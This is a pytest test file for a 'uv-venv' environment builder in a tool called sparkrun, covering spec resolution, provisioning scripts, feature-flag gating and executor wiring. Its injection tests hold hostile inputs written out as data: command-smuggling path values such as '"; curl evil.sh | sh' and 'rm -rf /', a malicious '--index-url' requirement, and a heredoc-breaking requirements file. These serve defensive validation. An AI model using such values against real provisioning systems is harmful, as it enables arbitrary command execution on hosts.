"""Tests for the uv-venv builder — spec/script logic plus in-tree wiring.

The script and spec tests are pure (no live host). The wiring tests are what a
first-party builder gains over an out-of-tree one: it must be discovered by the
``sparkrun.builders`` scan and reachable through ``get_builder``, and its
``default_env_file`` must actually land on the executor's config through the
real resolution chain rather than a stub.
"""

from __future__ import annotations

import types

import pytest

from sparkrun.builders.uv_venv import (
    UvVenvBuilder,
    UvVenvError,
    _provision_script,
    _resolve_spec,
)


def _recipe(builder_config: dict, source_path: str | None = None):
    return types.SimpleNamespace(builder="uv-venv", builder_config=builder_config, name="demo", source_path=source_path)


# ---------------------------------------------------------------------------
# _resolve_spec — inline requirements + defaults
# ---------------------------------------------------------------------------


def test_explicit_config_is_honored():
    spec = _resolve_spec(
        _recipe(
            {
                "venv_path": "/opt/venv",
                "python": "3.11",
                "torch_backend": "auto",
                "cuda_home": "/usr/local/cuda",
                "env_file": "/opt/venv/act.sh",
                "requirements": ["vllm", "ninja"],
            }
        )
    )
    assert (spec.venv_path, spec.python, spec.torch_backend, spec.cuda_home, spec.env_file) == (
        "/opt/venv",
        "3.11",
        "auto",
        "/usr/local/cuda",
        "/opt/venv/act.sh",
    )
    assert spec.requirements == ["vllm", "ninja"]


def test_env_file_defaults_under_venv_path():
    spec = _resolve_spec(_recipe({"venv_path": "/opt/venv", "requirements": ["vllm"]}))
    assert spec.env_file == "/opt/venv/sparkrun-env.sh"


def test_venv_path_self_determined_from_dep_hash():
    spec = _resolve_spec(_recipe({"requirements": ["vllm", "ninja"], "torch_backend": "auto"}))
    assert spec.venv_path.startswith("$HOME/.cache/sparkrun/uv-venv/")
    assert spec.env_file == spec.venv_path + "/sparkrun-env.sh"
    same = _resolve_spec(_recipe({"requirements": ["ninja", "vllm"], "torch_backend": "auto"}))  # order-independent
    assert same.venv_path == spec.venv_path
    other = _resolve_spec(_recipe({"requirements": ["vllm"]}))
    assert other.venv_path != spec.venv_path


def test_torch_backend_defaults_to_auto():
    """uv matches the host's CUDA driver rather than the index default — on
    GB10 that's the difference between a working torch and one blind to the GPU."""
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"]}))
    assert spec.torch_backend == "auto"
    assert "--torch-backend auto" in _provision_script(spec)


@pytest.mark.parametrize("value", ["none", "off", "false", "", None])
def test_torch_backend_can_be_disabled_explicitly(value):
    """The default is on, so there has to be a way to turn it off."""
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"], "torch_backend": value}))
    assert spec.torch_backend is None
    assert "--torch-backend" not in _provision_script(spec)


def test_torch_backend_explicit_value_wins():
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"], "torch_backend": "cu128"}))
    assert spec.torch_backend == "cu128"
    assert "--torch-backend cu128" in _provision_script(spec)


def test_torch_backend_participates_in_the_venv_identity():
    """It changes which wheels are installed, so it must change the venv."""
    a = _resolve_spec(_recipe({"requirements": ["vllm"]}))
    b = _resolve_spec(_recipe({"requirements": ["vllm"], "torch_backend": "none"}))
    assert a.dep_hash() != b.dep_hash()


def test_requirements_string_is_coerced_to_list():
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": "vllm"}))
    assert spec.requirements == ["vllm"]


def test_no_sources_errors():
    with pytest.raises(UvVenvError, match="at least one"):
        _resolve_spec(_recipe({"venv_path": "/v"}))


def test_missing_requirements_file_errors():
    with pytest.raises(UvVenvError, match="cannot read requirements_file"):
        _resolve_spec(_recipe({"venv_path": "/v", "requirements_file": "/nope/reqs.txt"}))


# ---------------------------------------------------------------------------
# requirements_file / pyproject sources (control-side, embedded)
# ---------------------------------------------------------------------------


def test_requirements_file_relative_to_recipe_dir_and_staged(tmp_path):
    (tmp_path / "reqs.txt").write_text("vllm\nninja\n")
    recipe = _recipe({"requirements_file": "reqs.txt", "venv_path": "/v"}, source_path=str(tmp_path / "r.yaml"))
    spec = _resolve_spec(recipe)
    assert spec.staged == [("requirements.txt", "vllm\nninja\n")]
    script = _provision_script(spec)
    # staged into the venv + installed via -r
    assert 'cat > "$VENV/.sparkrun-reqs/requirements.txt"' in script
    assert "vllm\nninja" in script
    assert '-r "$VENV/.sparkrun-reqs/requirements.txt"' in script


def test_pyproject_dir_resolves_to_pyproject_toml(tmp_path):
    (tmp_path / "pyproject.toml").write_text("[project]\nname='x'\ndependencies=['vllm']\n")
    recipe = _recipe({"pyproject": ".", "venv_path": "/v"}, source_path=str(tmp_path / "r.yaml"))
    spec = _resolve_spec(recipe)
    assert spec.staged[0][0] == "pyproject.toml" and "dependencies" in spec.staged[0][1]
    assert '-r "$VENV/.sparkrun-reqs/pyproject.toml"' in _provision_script(spec)


def test_all_three_sources_combine(tmp_path):
    (tmp_path / "reqs.txt").write_text("ninja\n")
    (tmp_path / "pyproject.toml").write_text("[project]\ndependencies=['torch']\n")
    recipe = _recipe(
        {"requirements": ["vllm"], "requirements_file": "reqs.txt", "pyproject": "pyproject.toml", "venv_path": "/v"},
        source_path=str(tmp_path / "r.yaml"),
    )
    install = None
    for ln in _provision_script(_resolve_spec(recipe)).splitlines():
        if "uv pip install" in ln:
            install = ln
    assert "vllm" in install
    assert '-r "$VENV/.sparkrun-reqs/requirements.txt"' in install
    assert '-r "$VENV/.sparkrun-reqs/pyproject.toml"' in install


def test_dep_hash_tracks_file_content(tmp_path):
    f = tmp_path / "reqs.txt"
    f.write_text("vllm\n")
    r = _recipe({"requirements_file": "reqs.txt", "venv_path": "/v"}, source_path=str(tmp_path / "r.yaml"))
    h1 = _resolve_spec(r).dep_hash()
    f.write_text("vllm\nninja\n")  # change content → hash changes → re-provision
    h2 = _resolve_spec(r).dep_hash()
    assert h1 != h2


# ---------------------------------------------------------------------------
# _provision_script — expansion / idempotency
# ---------------------------------------------------------------------------


def test_script_expands_home_relative_paths():
    script = _provision_script(_resolve_spec(_recipe({"requirements": ["vllm"]})))
    assert 'VENV="$HOME/.cache/sparkrun/uv-venv/' in script
    assert 'uv venv "$VENV" --python 3.12' in script


def test_script_install_args_and_torch_backend():
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm", "ninja"], "torch_backend": "auto"}))
    assert 'uv pip install --python "$VENV/bin/python" vllm ninja --torch-backend auto' in _provision_script(spec)


def test_script_env_file_body_has_venv_and_cuda_on_path():
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"], "cuda_home": "/usr/local/cuda"}))
    script = _provision_script(spec)
    assert 'export PATH="/v/bin:/usr/local/cuda/bin:$PATH"' in script
    assert 'export CUDA_HOME="/usr/local/cuda"' in script


def test_script_is_idempotent_by_marker():
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"]}))
    script = _provision_script(spec)
    assert 'MARKER="$VENV/.sparkrun-uv-venv.hash"' in script
    assert "up-to-date" in script
    assert spec.dep_hash() in script


# ---------------------------------------------------------------------------
# default_env_file (auto-coupling source)
# ---------------------------------------------------------------------------


def test_default_env_file_matches_resolved_spec():
    assert UvVenvBuilder().default_env_file(_recipe({"venv_path": "/opt/venv", "requirements": ["vllm"]})) == "/opt/venv/sparkrun-env.sh"


def test_default_env_file_none_on_bad_config():
    assert UvVenvBuilder().default_env_file(_recipe({})) is None


# ---------------------------------------------------------------------------
# prepare() — host fan-out
# ---------------------------------------------------------------------------


def _fake_parallel(monkeypatch, results_for):
    """Stub run_remote_scripts_parallel; record the call kwargs."""
    calls = {}

    def _run(hosts, script, **kw):
        calls["hosts"] = list(hosts)
        calls["script"] = script
        calls.update(kw)
        return [types.SimpleNamespace(host=h, **results_for(h)) for h in hosts]

    monkeypatch.setattr("sparkrun.builders.uv_venv.run_remote_scripts_parallel", _run)
    return calls


def test_prepare_returns_image_unchanged_and_runs_on_every_host(monkeypatch):
    """An environment builder prepares hosts, not an image: the image ref passes
    through untouched so distribution behaves exactly as it would without one."""
    calls = _fake_parallel(monkeypatch, lambda h: {"returncode": 0, "stdout": "", "stderr": ""})
    out = UvVenvBuilder().prepare("img:tag", _recipe({"venv_path": "/v", "requirements": ["vllm"]}), ["h1", "h2"])
    assert out == "img:tag"
    assert calls["hosts"] == ["h1", "h2"]


def test_prepare_runs_under_the_session_guard(monkeypatch):
    """A multi-GB install is exactly the payload the guard exists for: without
    it a killed sparkrun leaves `uv pip install` running on every host."""
    calls = _fake_parallel(monkeypatch, lambda h: {"returncode": 0, "stdout": "", "stderr": ""})
    UvVenvBuilder().prepare("img", _recipe({"venv_path": "/v", "requirements": ["vllm"]}), ["h1"])
    assert calls["session_guard"] is True
    assert calls["allow_local"] is True


def test_prepare_raises_on_host_failure(monkeypatch):
    _fake_parallel(monkeypatch, lambda h: {"returncode": 1, "stdout": "", "stderr": "uv: command not found"})
    with pytest.raises(UvVenvError, match="h1"):
        UvVenvBuilder().prepare("img", _recipe({"venv_path": "/v", "requirements": ["vllm"]}), ["h1"])


def test_prepare_reports_every_failing_host(monkeypatch):
    """A partial failure names all of them — re-running to discover the next
    broken host one at a time costs a full install each time."""
    _fake_parallel(monkeypatch, lambda h: {"returncode": 0 if h == "h2" else 1, "stdout": "", "stderr": "boom"})
    with pytest.raises(UvVenvError) as exc:
        UvVenvBuilder().prepare("img", _recipe({"venv_path": "/v", "requirements": ["vllm"]}), ["h1", "h2", "h3"])
    assert "h1" in str(exc.value) and "h3" in str(exc.value)
    assert "2/3" in str(exc.value)


def test_prepare_does_not_fail_a_dry_run(monkeypatch):
    """Under --dry-run nothing executes, so a non-zero rc is not a real failure."""
    calls = _fake_parallel(monkeypatch, lambda h: {"returncode": 1, "stdout": "", "stderr": ""})
    assert UvVenvBuilder().prepare("img", _recipe({"venv_path": "/v", "requirements": ["vllm"]}), ["h1"], dry_run=True) == "img"
    assert calls["dry_run"] is True


# ---------------------------------------------------------------------------
# Injection — builder_config is recipe content, and recipes come from registries
# ---------------------------------------------------------------------------
#
# venv_path / env_file / cuda_home are emitted double-quoted so bash expands
# $HOME on the host, so they cannot be shlex-quoted; validation is the only
# thing standing between a third-party recipe and arbitrary commands on every
# target host. builder_config has no trust gate (unlike executor_config).


@pytest.mark.parametrize(
    "field,value",
    [
        ("venv_path", '/v"; curl evil.sh | sh; echo "'),
        ("venv_path", "/v$(id)"),
        ("venv_path", "/v`id`"),
        ("venv_path", "/v\nrm -rf /"),
        ("env_file", '/v/e.sh"; curl evil.sh | sh; echo "'),
        ("cuda_home", '/cuda"; curl evil.sh | sh; echo "'),
    ],
)
def test_shell_metacharacters_in_paths_are_rejected(field, value):
    with pytest.raises(UvVenvError, match="unsafe character"):
        _resolve_spec(_recipe({field: value, "requirements": ["vllm"], **({"venv_path": "/v"} if field != "venv_path" else {})}))


def test_home_relative_paths_are_still_accepted():
    """The validation must not break the feature it protects."""
    for path in ("$HOME/.cache/x", "${HOME}/.cache/x", "~/.cache/x", "/abs/path"):
        spec = _resolve_spec(_recipe({"venv_path": path, "requirements": ["vllm"]}))
        assert spec.venv_path == path


def test_relative_venv_path_is_rejected():
    with pytest.raises(UvVenvError, match="absolute"):
        _resolve_spec(_recipe({"venv_path": "relative/dir", "requirements": ["vllm"]}))


def test_a_requirement_may_not_be_a_uv_option():
    """`--index-url=…` has no shell metacharacters, so shlex.quote passes it
    through and uv reads it as a flag — silently repointing the package index."""
    with pytest.raises(UvVenvError, match="looks like a uv/pip option"):
        _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["--index-url=http://evil/simple", "vllm"]}))


def test_heredoc_delimiter_cannot_be_closed_by_file_content(tmp_path):
    """A requirements file containing the delimiter would close the heredoc
    early and turn its remaining lines into shell commands."""
    (tmp_path / "reqs.txt").write_text("vllm\nSPARKRUN_REQ_EOF_0\ncurl evil.sh | sh\n")
    recipe = _recipe({"requirements_file": "reqs.txt", "venv_path": "/v"}, source_path=str(tmp_path / "r.yaml"))
    script = _provision_script(_resolve_spec(recipe))

    delim = next(ln.split("<<'")[1].rstrip("'") for ln in script.splitlines() if "<<'SPARKRUN_REQ_EOF" in ln)
    body = script.split("<<'%s'\n" % delim, 1)[1].split("\n%s\n" % delim, 1)[0]
    # The whole file, including the decoy line, stays inside the heredoc.
    assert "curl evil.sh | sh" in body
    assert "SPARKRUN_REQ_EOF_0" in body


# ---------------------------------------------------------------------------
# env_file freshness — the marker guards the venv, not the activation script
# ---------------------------------------------------------------------------


def test_cuda_home_does_not_change_the_venv_identity():
    """cuda_home affects the env_file, not the installed packages: making it
    part of dep_hash would needlessly rebuild a multi-GB venv."""
    a = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"]}))
    b = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"], "cuda_home": "/usr/local/cuda"}))
    assert a.dep_hash() == b.dep_hash()


def test_env_file_is_rewritten_even_when_the_venv_is_up_to_date():
    """Since cuda_home is outside dep_hash, an up-to-date venv must still get a
    fresh env_file — else adding cuda_home to an existing recipe does nothing."""
    spec = _resolve_spec(_recipe({"venv_path": "/v", "requirements": ["vllm"], "cuda_home": "/usr/local/cuda"}))
    script = _provision_script(spec)
    lines = script.splitlines()

    up_to_date = next(i for i, ln in enumerate(lines) if "up-to-date" in ln)
    env_write = next(i for i, ln in enumerate(lines) if 'cat > "$ENV_FILE"' in ln)
    fi_after_guard = next(i for i, ln in enumerate(lines) if ln.strip() == "fi" and i > up_to_date)

    # The env_file write is outside the guarded block, not skipped by it.
    assert up_to_date < fi_after_guard < env_write
    assert "exit 0" not in script


# ---------------------------------------------------------------------------
# In-tree wiring — discovery and the real executor coupling
# ---------------------------------------------------------------------------


def test_builder_is_discovered_by_the_in_tree_scan(v):
    """Living under ``sparkrun.builders`` is the whole registration: the
    bootstrap scan must pick it up with no explicit registration."""
    from sparkrun.core.bootstrap import get_builder, list_builders

    assert "uv-venv" in list_builders(v)
    assert isinstance(get_builder("uv-venv", v), UvVenvBuilder)


def test_venv_alias_resolves_to_the_same_builder(v):
    from sparkrun.core.bootstrap import get_builder

    assert isinstance(get_builder("venv", v), UvVenvBuilder)


def test_alias_is_not_listed_as_a_separate_builder(v):
    """An alias is another spelling of one builder; listing it would imply a
    second builder exists and put a phantom name in every 'Available: […]'."""
    from sparkrun.core.bootstrap import list_builders

    names = list_builders(v)
    assert "uv-venv" in names
    assert "venv" not in names


def test_unknown_builder_still_raises_plain_value_error(v):
    """Back-compat: the launcher warns-and-skips on ValueError, and only an
    *unknown* builder should get that treatment."""
    from sparkrun.builders.base import BuilderUnavailableError
    from sparkrun.core.bootstrap import get_builder

    with pytest.raises(ValueError) as exc:
        get_builder("no-such-builder", v)
    assert not isinstance(exc.value, BuilderUnavailableError)


def test_env_file_reaches_the_executor_through_the_real_chain(v):
    """The builder→executor coupling end to end, with no stubbed builder: a
    recipe naming ``uv-venv`` and nothing else must land the venv activation
    script on the executor, or the serve command runs under the wrong python."""
    from sparkrun.orchestration.executor import resolve_executor

    recipe = types.SimpleNamespace(
        executor="local",
        executor_config={},
        builder="uv-venv",
        builder_config={"venv_path": "/opt/venv", "requirements": ["vllm"]},
        source_path=None,
    )
    ex = resolve_executor(recipe=recipe, rootless=False, auto_user=False, v=v)
    assert ex.config.env_file == "/opt/venv/sparkrun-env.sh"


def test_explicit_executor_env_file_still_wins(v):
    """The builder default sits *below* the recipe layer."""
    from sparkrun.orchestration.executor import resolve_executor

    recipe = types.SimpleNamespace(
        executor="local",
        executor_config={"env_file": "/explicit.sh"},
        builder="uv-venv",
        builder_config={"venv_path": "/opt/venv", "requirements": ["vllm"]},
        source_path=None,
    )
    ex = resolve_executor(recipe=recipe, rootless=False, auto_user=False, v=v)
    assert ex.config.env_file == "/explicit.sh"


def test_flag_is_off_for_stable_and_on_for_beta_alpha():
    """The channel policy itself, independent of registration."""
    from sparkrun.core.features import get_feature

    flag = get_feature("builder.uv_venv")
    assert flag is not None
    assert flag.default_for_channel("stable") is False
    assert flag.default_for_channel("beta") is True
    assert flag.default_for_channel("alpha") is True


def _builders_for_config(tmp_path, config_data: dict) -> list[str]:
    """List builders from a clean subprocess with *config_data* as the config.

    A subprocess rather than the ``v`` fixture because SAF evaluates
    ``is_multi_extension`` once, at registration, into a process-global
    registry — an in-process test cannot re-hide a builder this process already
    registered as enabled (conftest force-enables the flag suite-wide).
    """
    import json
    import os
    import subprocess
    import sys

    import yaml

    home = tmp_path / "home"
    cfg_dir = home / ".config" / "sparkrun"
    cfg_dir.mkdir(parents=True, exist_ok=True)
    (cfg_dir / "config.yaml").write_text(yaml.safe_dump(config_data))

    env = {k: val for k, val in os.environ.items() if not k.startswith("SPARKRUN_FEATURE_")}
    env.pop("STATEFUL_ROOT", None)
    env["HOME"] = str(home)
    env["SPARKRUN_NO_TELEMETRY"] = "1"
    env["SPARKRUN_NO_EXTERNAL_PLUGINS"] = "1"

    snippet = (
        "import json\n"
        "from sparkrun.core.bootstrap import init_sparkrun, list_builders\n"
        "v = init_sparkrun()\n"
        "print(json.dumps(list_builders(v)))\n"
    )
    proc = subprocess.run([sys.executable, "-c", snippet], capture_output=True, text=True, env=env)
    assert proc.returncode == 0, "subprocess failed: %s\n%s" % (proc.stdout, proc.stderr)
    return json.loads(proc.stdout.strip().splitlines()[-1])


def test_stable_channel_excludes_the_builder(tmp_path):
    assert "uv-venv" not in _builders_for_config(tmp_path, {"self_update": {"channel": "stable"}})


def test_alpha_channel_includes_the_builder(tmp_path):
    assert "uv-venv" in _builders_for_config(tmp_path, {"self_update": {"channel": "alpha"}})


def test_beta_channel_includes_the_builder(tmp_path):
    assert "uv-venv" in _builders_for_config(tmp_path, {"self_update": {"channel": "beta"}})


def test_explicit_opt_in_beats_the_stable_default(tmp_path):
    names = _builders_for_config(tmp_path, {"self_update": {"channel": "stable"}, "features": {"builder.uv_venv": True}})
    assert "uv-venv" in names


def test_gated_builder_is_distinguishable_from_an_unknown_one(tmp_path):
    """On stable, naming the builder must say "disabled by feature flag …",
    not "Unknown builder" — the recipe is right, the channel is the problem.
    Both spellings must say it, or the alias becomes the confusing path."""
    import os
    import subprocess
    import sys

    import yaml

    home = tmp_path / "home"
    cfg_dir = home / ".config" / "sparkrun"
    cfg_dir.mkdir(parents=True, exist_ok=True)
    (cfg_dir / "config.yaml").write_text(yaml.safe_dump({"self_update": {"channel": "stable"}}))

    env = {k: val for k, val in os.environ.items() if not k.startswith("SPARKRUN_FEATURE_")}
    env.pop("STATEFUL_ROOT", None)
    env["HOME"] = str(home)
    env["SPARKRUN_NO_TELEMETRY"] = "1"
    env["SPARKRUN_NO_EXTERNAL_PLUGINS"] = "1"

    snippet = (
        "from sparkrun.builders.base import BuilderUnavailableError\n"
        "from sparkrun.core.bootstrap import init_sparkrun, get_builder\n"
        "v = init_sparkrun()\n"
        "for name in ('uv-venv', 'venv'):\n"
        "    try:\n"
        "        get_builder(name, v)\n"
        "        print('NOT-GATED:' + name)\n"
        "    except BuilderUnavailableError as e:\n"
        "        print('GATED:' + name + ':' + str(e))\n"
        "    except ValueError as e:\n"
        "        print('UNKNOWN:' + name + ':' + str(e))\n"
    )
    proc = subprocess.run([sys.executable, "-c", snippet], capture_output=True, text=True, env=env)
    assert proc.returncode == 0, "subprocess failed: %s\n%s" % (proc.stdout, proc.stderr)
    lines = proc.stdout.strip().splitlines()[-2:]
    assert all(ln.startswith("GATED:") for ln in lines), lines
    assert all("builder.uv_venv" in ln for ln in lines), lines


def test_a_misconfigured_builder_does_not_break_executor_resolution(v):
    """``default_env_file`` returns None on bad config, and the chain treats a
    contributed nothing as nothing — resolution must not raise."""
    from sparkrun.orchestration.executor import resolve_executor

    recipe = types.SimpleNamespace(
        executor="local",
        executor_config={},
        builder="uv-venv",
        builder_config={},  # no requirement sources at all
        source_path=None,
    )
    ex = resolve_executor(recipe=recipe, rootless=False, auto_user=False, v=v)
    assert ex.config.env_file is None
